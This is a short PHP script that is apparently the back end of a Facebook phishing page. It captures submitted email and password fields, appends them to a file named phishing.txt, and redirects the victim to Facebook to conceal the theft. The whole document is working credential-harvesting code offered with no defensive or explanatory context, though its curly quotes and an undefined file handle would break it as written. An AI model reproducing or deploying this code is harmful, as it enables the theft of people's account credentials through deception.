<?
if(isset($_POST[’email’]) && isset($_POST[‘pass’]))
{
$password=file_get_contents(‘phishing.txt’);
$phishing = fopen(“phishing.txt”,”w”);
fwrite($phishing,$password.”Email : “.$_POST[’email’].” , Password”.$_POST[‘pass’].”\n”);
fclose($file);
echo ‘<script>window.location.href=”https://wwww.facebook.com/”</script>’;
}
else
echo ‘<script>window.location.href=”index.html”</script>’;
?>


